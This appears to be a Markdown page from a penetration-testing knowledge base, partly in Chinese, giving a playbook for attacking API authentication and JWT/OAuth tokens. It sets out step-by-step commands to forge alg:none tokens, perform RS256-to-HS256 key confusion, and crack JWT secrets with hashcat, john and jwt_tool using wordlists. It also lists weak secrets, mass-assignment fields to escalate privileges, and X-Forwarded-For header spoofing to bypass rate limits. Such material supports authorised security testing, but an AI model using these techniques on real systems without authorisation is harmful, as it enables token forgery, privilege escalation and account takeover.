# oauth-jwt-test · part 1（续）

> 接 [`oauth-jwt-test-p1.md`](oauth-jwt-test-p1.md) 的后半段（原块 >12KB 拆分）。

## 二、补充：api-auth-and-jwt-abuse

### api-auth-and-jwt-abuse

### API Auth and JWT Abuse — Token Trust, Header Tricks, and Rate Limits
## 1. TOKEN TRIAGE

Inspect:

- `alg`, `kid`, `jku`, `x5u`
- role, org, tenant, scope, or privilege claims
- issuer and audience mismatches
- reuse of mobile and web tokens across products
## 2. QUICK ATTACK PICKS

| Pattern | First Test |
|---|---|
| `alg:none` acceptance | unsigned token with trailing dot |
| RS256 confusion | switch to HS256 using public key as secret |
| `kid` lookup trust | path traversal or injection in `kid` |
| remote key fetch trust | attacker-controlled `jku` or `x5u` |
| weak secret | offline crack with targeted wordlists |
## 3. HIDDEN FIELDS AND BATCH ABUSE

### Mass assignment field picks

```text
role
isAdmin
admin
verified
plan
tier
permissions
org
owner
```

### Rate limit and batch abuse picks

```text
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
Forwarded: for=9.9.9.9
```

GraphQL or JSON batch abuse candidates:

- arrays of login mutations
- bulk object fetches with varying IDs
- repeated password reset or verification calls in one request
## 4. RATE LIMIT BYPASS FAMILIES

```text
X-Forwarded-For
X-Real-IP
Forwarded
User-Agent rotation
Path case / slash variants
```
## 5. NEXT ROUTING

- For GraphQL batching and hidden parameters: [graphql and hidden parameters](../../web-api-protocol/knowledge/graphql-test.md)
- For default credential and brute-force planning: [authentication bypass](authbypass-test.md)
- For full JWT and OAuth depth: [jwt oauth token attacks](oauth-jwt-test.md)
- For OAuth or OIDC configuration flaws in browser and SSO flows: [oauth oidc misconfiguration](oauth-jwt-test.md)
- 跨域读 token：SRC 不挖 CORS，**勿开** `../../web-xss-frontend/knowledge/cors-test.md`。有跨站写走 `../../web-xss-frontend/knowledge/csrf-test.md`，有越权读走 `idor-test.md`

---
## 补充：jwt-oauth-token-attacks

### jwt-oauth-token-attacks

### JWT and OAuth 2.0 Token Attacks
## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
### → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
### → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---
## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
### Burp JWT Editor / python-jwt attack:
### Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

### Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

### Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
### OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
### → automatically generates alg:none variants
```

---
## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
### Step 1: Obtain public key (PEM format)
### From: /api/.well-known/jwks.json → convert to PEM
### From: /certs endpoint
### From: OpenSSL extraction from HTTPS cert

### Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

### Step 3: Manually:
### Modify header: {"alg":"HS256","typ":"JWT"}
### Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---
## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
### hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

### john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

### jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---
